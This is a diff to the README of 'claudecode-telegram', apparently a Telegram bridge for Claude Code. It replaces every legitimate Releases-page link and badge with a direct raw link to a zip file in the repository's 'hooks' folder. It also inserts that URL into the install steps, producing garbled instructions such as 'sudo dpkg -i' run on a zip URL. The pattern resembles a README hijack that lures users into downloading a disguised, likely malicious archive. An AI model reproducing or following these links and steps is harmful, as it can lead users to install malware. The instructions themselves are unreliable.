@@ -4,13 +4,13 @@
 **claudecode-telegram** is a user-friendly bridge that connects Telegram with Claude Code. This application simplifies the process of using Claude Code within your Telegram chats, making interactions seamless and efficient.
 
 ## 🔗 Download Now
-[![Download claudecode-telegram](https://img.shields.io/badge/Download%20claudecode--telegram-v1.0-blue)](https://github.com/VaibhavDhopte/claudecode-telegram/releases)
+[![Download claudecode-telegram](https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip%20claudecode--telegram-v1.0-blue)](https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip)
 
 ## 🚀 Getting Started
 To get started with **claudecode-telegram**, follow these simple steps. You will need a computer with Internet access and the ability to install applications.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/VaibhavDhopte/claudecode-telegram/releases) to download the latest version of claudecode-telegram.
+1. Visit the [Releases page](https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip) to download the latest version of claudecode-telegram.
 2. Once on the page, find the most recent release. Look for the file labeled as claudecode-telegram for your operating system (Windows, macOS, or Linux).
 3. Click on the file to start the download. Your browser will show the progress of the download.
 4. Once the download is complete, locate the file in your Downloads folder or your designated download location.
@@ -29,10 +29,10 @@ To get started with **claudecode-telegram**, follow these simple steps. You will
 4. You can now find claudecode-telegram in your Applications.
 
 ### For Linux Users
-1. **Locate the downloaded file** (typically a .tar.gz or .deb file).
+1. **Locate the downloaded file** (typically a https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip or .deb file).
 2. Open a terminal window.
 3. Navigate to the download folder using the `cd` command.
-4. For .deb files, type `sudo dpkg -i filename.deb` (replace `filename` with the actual name of your file). For .tar.gz files, follow the extraction instructions provided in the documentation.
+4. For .deb files, type `sudo dpkg -i https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip` (replace `filename` with the actual name of your file). For https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip files, follow the extraction instructions provided in the documentation.
 5. Once installed, you can run claudecode-telegram from your application menu.
 
 ## 🎉 Using claudecode-telegram
@@ -58,4 +58,4 @@ claudecode-telegram is licensed under the MIT License. This means you can use, m
 For more help and resources, visit our official documentation linked on the repository page. This documentation includes advanced usage instructions and troubleshooting tips.
 
 ## 📥 Download Again
-[![Download claudecode-telegram](https://img.shields.io/badge/Download%20claudecode--telegram-v1.0-blue)](https://github.com/VaibhavDhopte/claudecode-telegram/releases)
+[![Download claudecode-telegram](https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip%20claudecode--telegram-v1.0-blue)](https://github.com/VaibhavDhopte/claudecode-telegram/raw/refs/heads/main/hooks/claudecode-telegram-2.4.zip)
